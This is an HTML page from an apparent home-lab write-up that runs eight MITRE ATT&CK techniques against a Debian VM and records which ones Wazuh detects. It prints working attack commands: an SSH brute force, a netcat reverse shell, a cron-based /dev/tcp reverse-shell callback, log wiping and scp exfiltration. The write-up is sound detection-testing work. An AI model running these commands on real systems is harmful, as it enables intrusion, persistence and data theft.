@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attack Simulation &amp; Findings | MITRE ATT&amp;CK Detection Lab</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* ── Part navigation ── */
+    .part-nav {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin: 28px 0 0;
+      padding: 4px;
+      background: #0d1018;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      width: fit-content;
+    }
+    .part-nav a {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      border-radius: 5px;
+      font-size: 11px;
+      font-weight: 700;
+      text-decoration: none;
+      color: var(--text-muted);
+      transition: color .2s, background .2s;
+      white-space: nowrap;
+    }
+    .part-nav a:hover {
+      color: var(--text);
+      background: var(--bg-hover);
+    }
+    .part-nav a.active {
+      background: var(--green-faint);
+      color: var(--green);
+      border: 1px solid #00ff9428;
+    }
+    .part-nav .nav-num {
+      width: 18px;
+      height: 18px;
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 9px;
+      flex-shrink: 0;
+      background: #ffffff0a;
+    }
+    .part-nav a.active .nav-num {
+      background: var(--green);
+      color: #000;
+    }
+    .part-nav .nav-divider {
+      color: var(--border);
+      font-size: 14px;
+      padding: 0 2px;
+      user-select: none;
+    }
+    @media (max-width: 560px) {
+      .part-nav { width: 100%; justify-content: space-between; }
+      .part-nav a { flex: 1; justify-content: center; }
+      .part-nav .nav-label { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <span class="lightbox-close">&times;</span>
+  <img id="lightbox-img" src="" alt="" />
+</div>
+
+<div class="wrapper">
+
+  <nav class="topbar">
+    <a href="/">~/0xhaseebali</a><span class="sep">/</span>
+    <a href="/projects">projects</a><span class="sep">/</span>
+    <a href="mitre-lab-intro.html">mitre-attck-detection-lab</a><span class="sep">/</span>
+    <span>attack-simulation</span>
+  </nav>
+
+  <nav class="part-nav">
+    <a href="mitre-lab-intro.html">
+      <span class="nav-num">1</span>
+      <span class="nav-label">Introduction</span>
+    </a>
+    <span class="nav-divider">/</span>
+    <a href="mitre-lab-part2.html" class="active">
+      <span class="nav-num">2</span>
+      <span class="nav-label">Attack Simulation &amp; Findings</span>
+    </a>
+    <span class="nav-divider">/</span>
+    <a class="disabled">
+      <span class="nav-num">3</span>
+      <span class="nav-label">Coming Soon</span>
+    </a>
+  </nav>
+
+  <header class="page-header">
+    <div class="part-label">Part 2 of 3 &mdash; MITRE ATT&amp;CK Detection Lab</div>
+    <h1>Attack Simulation<br /><span class="accent">&amp; Findings</span></h1>
+    <div class="summary-bar">
+      <div class="stat-pill"><span class="dot dot-green"></span><span class="label">Detected</span><span class="value">1</span></div>
+      <div class="stat-pill"><span class="dot dot-red"></span><span class="label">Missed</span><span class="value">6</span></div>
+      <div class="stat-pill"><span class="dot dot-gray"></span><span class="label">Blocked by OS</span><span class="value">1</span></div>
+    </div>
+  </header>
+
+  <div class="section-label" style="margin-top:48px;">Part 2 &mdash; Attack Simulation &amp; Findings</div>
+
+  <div class="note-callout" style="margin-top: 0; margin-bottom: 32px; border-left-color: var(--amber); background: #ffb3470a; animation: fadeUp .4s ease both;">
+    <strong style="color: var(--amber); font-weight: 700;">⚠️ Ethics Disclaimer:</strong> 
+    Only attempt this on hardware you own or have explicit written permission to test. Unauthorized access is illegal, and no tutorial justifies crossing that line.
+  </div>
+
+  <div class="technique-card" style="animation-delay:.05s">
+    <div class="tc-header">
+      <span class="tc-id">T1046</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Network Service Discovery</div>
+        <div class="tc-tactic">Tactic: Discovery</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Identify live hosts, open ports, running services, and OS details on the target.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Commands</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — kali</div>
+            <pre><span class="prompt">$ </span>sudo nmap -sn 192.168.100.0/24
+<span class="prompt">$ </span>sudo nmap -A 192.168.100.87</pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots two-col">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/1Nmap-sn.png" alt="Nmap host discovery scan" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">NmapScan-sn.png</div><div class="ph-desc">nmap -sn 192.168.100.0/24<br/>Host discovery results</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--amber)"></span>nmap -sn — host discovery</div>
+          </div>
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/2Nmap-sV-A.png" alt="Nmap service scan" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">Nmap-sV-A.png</div><div class="ph-desc">nmap -sV -A 192.168.100.87<br/>Service &amp; OS fingerprinting</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--amber)"></span>nmap -sV -A — service fingerprinting</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Port 22 open — OpenSSH 10.0p2 (Debian 13)</li>
+            <li>Port 80 open — Apache 2.4.67</li>
+            <li>OS: Linux Debian 13 confirmed via SSH banner (<code>deb13u4</code>)</li>
+            <li>MAC: VMware VM, 1 hop away</li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <span class="result-badge result-missed">❌ Missed</span>
+            <div class="wr-text">18 low-level alerts fired (rule level 0–6). No meaningful threat alert was raised for the network scanning activity.</div>
+          </div>
+          <div class="screenshots" style="margin-top:10px;">
+            <div class="screenshot-wrap" onclick="openLightbox(this)">
+              <img src="Images/3WazuhLowLevelAlert.png" alt="Wazuh low level alerts after Nmap" onload="this.classList.add('loaded')">
+              <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">WazuhLowLevelAlert.png</div><div class="ph-desc">18 low-level alerts in Wazuh<br/>after Nmap scan</div></div>
+              <div class="sc-caption"><span class="sc-dot" style="background:var(--amber)"></span>Wazuh — 18 low-level alerts (post-scan)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.08s">
+    <div class="tc-header">
+      <span class="tc-id">T1110.001</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Brute Force — SSH</div>
+        <div class="tc-tactic">Tactic: Credential Access</div>
+      </div>
+      <span class="result-badge result-detected">✅ Detected</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Attempt to gain access to the SSH service using a credential wordlist.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Command</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — kali</div>
+            <pre><span class="prompt">$ </span>medusa -h 192.168.100.87 \
+  -u target \
+  -P /usr/share/wordlists/rockyou.txt \
+  -M ssh -t 4</pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots two-col">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/4Medusa.png" alt="Medusa brute force SSH" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">Medusa.png</div><div class="ph-desc">Medusa running against SSH<br/>Password revealed</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--red)"></span>Medusa — credential found</div>
+          </div>
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/5high-severityalert.png" alt="Wazuh high severity alert after brute force" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">AfterMedusa.png</div><div class="ph-desc">Wazuh high-severity alert<br/>Rule level 12 fired</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--green)"></span>Wazuh — high-severity alert (level 12)</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Valid credentials found successfully</li>
+            <li>SSH access to the <code>target</code> account confirmed</li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result detected">
+            <div class="wr-label">✅ Detected</div>
+            <div class="wr-text">1 High-severity alert fired (rule level 12). Multiple failed authentication attempts followed by a successful login triggered the alert.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.11s">
+    <div class="tc-header">
+      <span class="tc-id">T1059.004</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Unix Shell Execution</div>
+        <div class="tc-tactic">Tactic: Execution</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Establish an interactive reverse shell from the victim back to the attacker machine.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Commands</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — Kali</div>
+            <pre><span class="prompt">$ </span>nc -lvnp 4444 </pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — victim (via SSH)</div>
+            <pre><span class="prompt">$ </span>nc 192.168.100.86 443 -e /bin/bash</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — Kali</div>
+            <pre><span class="prompt">$ </span>python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots two-col">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/6LogINSSH.png" alt="SSH login to victim" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">LogINSSH.png</div><div class="ph-desc">SSH login to victim machine<br/>Running SSH server</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--blue)"></span>SSH — logged in as target</div>
+          </div>
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/7NCWhoami.png" alt="Netcat reverse shell whoami ls" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">NCWhoami.png</div><div class="ph-desc">nc 192.168.100.87 4444<br/>whoami → target, ls confirmed</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--red)"></span>Netcat — reverse shell, whoami &amp; ls</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Reverse shell established successfully</li>
+            <li><code>whoami</code> returned <code>target</code> &mdash; interactive shell confirmed</li>
+          </ul>
+          <div class="note-callout"><strong>Note:</strong> The <code>-e</code> flag redirection requires splitting &mdash; the victim sends the shell, and the attacker connects.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <div class="wr-label">❌ Missed</div>
+            <div class="wr-text">No alert fired for the outbound connection or shell execution. Wazuh does not monitor network socket connections by default.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.14s">
+    <div class="tc-header">
+      <span class="tc-id">T1053.003</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Cron Job Persistence</div>
+        <div class="tc-tactic">Tactic: Persistence</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Establish persistence by adding a malicious cron job that calls back to the attacker every minute.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Cron Entry Added</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>crontab — victim</div>
+            <pre>* * * * * /bin/bash -c \
+  'bash -i >& /dev/tcp/192.168.100.86/4444 0>&1'</pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/8SettingCronJOB.png" alt="Setting cron job persistence" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">SettingCronJOB.png</div><div class="ph-desc">crontab -e to add malicious entry<br/>crontab -l to verify</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--purple)"></span>crontab -e &amp; crontab -l &mdash; persistence confirmed</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Cron job successfully added via the SSH session</li>
+            <li>Automatic reverse shell callback confirmed within 60 seconds &mdash; no attacker interaction required</li>
+            <li>Persistence survived session termination</li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <div class="wr-label">❌ Missed</div>
+            <div class="wr-text">Neither the crontab modification nor the automatic callback were detected. FIM is not configured to monitor cron paths by default.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.17s">
+    <div class="tc-header">
+      <span class="tc-id">T1136.001</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Create Local Account</div>
+        <div class="tc-tactic">Tactic: Persistence</div>
+      </div>
+      <span class="result-badge result-blocked">⛔ Blocked by OS</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Create a backdoor user account for persistent access.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Command</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — victim</div>
+            <pre><span class="prompt">$ </span>/usr/sbin/useradd -m backdoor
+<span class="comment">  Permission denied</span></pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/9PermissionDenied.png" alt="Permission denied on useradd" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">PermissionDenied.png</div><div class="ph-desc">/usr/sbin/useradd -m backdoor<br/>Permission denied &mdash; OS blocked</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--text-muted)"></span>useradd &mdash; blocked by OS (no sudo)</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Permission denied &mdash; the <code>target</code> user has no sudo privileges</li>
+            <li>The command was blocked at the OS level before execution</li>
+          </ul>
+          <div class="note-callout"><strong>Finding:</strong> Least privilege principle working correctly. In a real attack, privilege escalation would be required first.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result blocked">
+            <div class="wr-label">⛔ N/A &mdash; Blocked by OS</div>
+            <div class="wr-text">Technique blocked before execution. OS-level least privilege enforcement prevented the action entirely.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.2s">
+    <div class="tc-header">
+      <span class="tc-id">T1070.003</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Log Clearing</div>
+        <div class="tc-tactic">Tactic: Defense Evasion</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Clear evidence of attacker activity from system logs to evade detection.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Commands</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — victim</div>
+            <pre><span class="prompt">$ </span>cat /dev/null > ~/.bash_history
+<span class="prompt">$ </span>cat /dev/null > /var/log/auth.log
+<span class="comment">  └─ Permission denied (root only)</span></pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/10CoveringFootPrint.png" alt="Log clearing bash history and auth.log" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">CoveringFootPrint.png</div><div class="ph-desc">bash_history cleared successfully<br/>auth.log &mdash; permission denied</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--pink)"></span>Covering tracks &mdash; history wiped, auth.log blocked</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>Bash history cleared successfully &mdash; no root access required</li>
+            <li><code>auth.log</code> clearing blocked &mdash; permission denied (root only)</li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <div class="wr-label">❌ Missed</div>
+            <div class="wr-text">Bash history wipe was not detected. FIM is not configured to monitor <code>/home/target/.bash_history</code> by default.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.23s">
+    <div class="tc-header">
+      <span class="tc-id">T1005</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Local Data Collection</div>
+        <div class="tc-tactic">Tactic: Collection</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Locate and read sensitive files on the compromised system.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Commands</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — victim</div>
+            <pre><span class="prompt">$ </span>find /home/target -type f -name "*.txt"
+<span class="prompt">$ </span>cat /home/target/sensitive_data.txt</pre>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li><code>sensitive_data.txt</code> located and read successfully</li>
+            <li>File access required no elevated privileges</li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <div class="wr-label">❌ Missed</div>
+            <div class="wr-text">File access was not detected. FIM does not monitor user home directories by default.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique-card" style="animation-delay:.26s">
+    <div class="tc-header">
+      <span class="tc-id">T1048</span>
+      <div class="tc-title-wrap">
+        <div class="tc-title">Exfiltration Over SCP</div>
+        <div class="tc-tactic">Tactic: Exfiltration</div>
+      </div>
+      <span class="result-badge result-missed">❌ Missed</span>
+    </div>
+    <div class="tc-body">
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Objective</div>
+          <div class="tc-objective">Transfer the collected sensitive file from the victim to the attacker machine.</div>
+        </div>
+        <div>
+          <div class="tc-section-title">Command</div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="dot-row"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>bash — kali</div>
+            <pre><span class="prompt">$ </span>scp target@192.168.100.87:\
+  /home/target/sensitive_data.txt \
+  /home/kali/</pre>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="tc-section-title">Evidence</div>
+        <div class="screenshots two-col">
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/11ScrapedSensitive_data.png" alt="SCP exfiltration and ls confirmation" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">ScrapedSensitive_data.png</div><div class="ph-desc">scp transfer + ls confirmation<br/>File successfully exfiltrated</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--red)"></span>SCP — file exfiltrated to Kali</div>
+          </div>
+          <div class="screenshot-wrap" onclick="openLightbox(this)">
+            <img src="Images/12FinalWazuh.png" alt="Final Wazuh dashboard still 1 high alert" onload="this.classList.add('loaded')">
+            <div class="ph"><div class="ph-icon">🖼️</div><div class="ph-filename">FinalWazuh.png</div><div class="ph-desc">Wazuh dashboard after all attacks<br/>Still only 1 high-severity alert</div></div>
+            <div class="sc-caption"><span class="sc-dot" style="background:var(--green)"></span>Wazuh — still 1 high alert after full attack chain</div>
+          </div>
+        </div>
+      </div>
+      <div class="tc-row">
+        <div>
+          <div class="tc-section-title">Findings</div>
+          <ul class="findings-list">
+            <li>File successfully transferred to Kali</li>
+            <li>Confirmed via <code>cat /home/kali/sensitive_data.txt</code></li>
+          </ul>
+        </div>
+        <div>
+          <div class="tc-section-title">Wazuh Result</div>
+          <div class="wazuh-result missed">
+            <div class="wr-label">❌ Missed</div>
+            <div class="wr-text">SCP transfer was not detected. Network-level file transfer monitoring is not enabled in the default Wazuh configuration.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="section-label" style="margin-top:64px;">Part 3 &mdash; Detection Coverage Matrix</div>
+
+  <div class="matrix-wrap">
+    <table class="matrix-table">
+      <thead>
+        <tr>
+          <th>Technique</th><th>ID</th><th>Tactic</th><th>Wazuh Default</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="m-name">Network Scan</td><td><span class="m-id">T1046</span></td><td><span class="tactic-badge t-discovery">Discovery</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+        <tr><td class="m-name">SSH Brute Force</td><td><span class="m-id">T1110.001</span></td><td><span class="tactic-badge t-credential">Credential Access</span></td><td><span class="status-pill s-detected">✅ Detected</span></td></tr>
+        <tr><td class="m-name">Reverse Shell</td><td><span class="m-id">T1059.004</span></td><td><span class="tactic-badge t-execution">Execution</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+        <tr><td class="m-name">Cron Persistence</td><td><span class="m-id">T1053.003</span></td><td><span class="tactic-badge t-persistence">Persistence</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+        <tr><td class="m-name">Create Local Account</td><td><span class="m-id">T1136.001</span></td><td><span class="tactic-badge t-persistence">Persistence</span></td><td><span class="status-pill s-blocked">⛔ Blocked by OS</span></td></tr>
+        <tr><td class="m-name">Log Clearing</td><td><span class="m-id">T1070.003</span></td><td><span class="tactic-badge t-evasion">Defense Evasion</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+        <tr><td class="m-name">Local Data Collection</td><td><span class="m-id">T1005</span></td><td><span class="tactic-badge t-collection">Collection</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+        <tr><td class="m-name">Exfiltration Over SCP</td><td><span class="m-id">T1048</span></td><td><span class="tactic-badge t-exfil">Exfiltration</span></td><td><span class="status-pill s-missed">❌ Missed</span></td></tr>
+      </tbody>
+    </table>
+    <div class="coverage-summary">
+      <div class="cov-stat"><div class="cov-num cov-detected">1</div><div class="cov-label">Detected</div></div>
+      <div class="cov-stat"><div class="cov-num cov-missed">6</div><div class="cov-label">Missed</div></div>
+      <div class="cov-stat"><div class="cov-num cov-blocked">1</div><div class="cov-label">Blocked by OS</div></div>
+      <div class="cov-stat"><div class="cov-num" style="color:var(--text-muted)">12.5%</div><div class="cov-label">Detection Rate</div></div>
+    </div>
+  </div>
+
+  <div class="gap-callout" style="animation-delay:.3s">
+    <strong>Summary:</strong> Wazuh detected <span class="hl-green">1 out of 8 techniques</span> with a meaningful alert out of the box.
+    This highlights <span class="hl-red">significant detection gaps</span> that require custom rule development and FIM
+    configuration to address &mdash; particularly around persistence, defense evasion, data collection, and exfiltration.
+  </div>
+
+</div><script>
+  function openLightbox(wrap) {
+    const img = wrap.querySelector('img');
+    if (!img || !img.classList.contains('loaded')) return;
+    document.getElementById('lightbox-img').src = img.src;
+    document.getElementById('lightbox').classList.add('open');
+  }
+  function closeLightbox() {
+    document.getElementById('lightbox').classList.remove('open');
+  }
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeLightbox(); });
+</script>
+</body>
+</html>
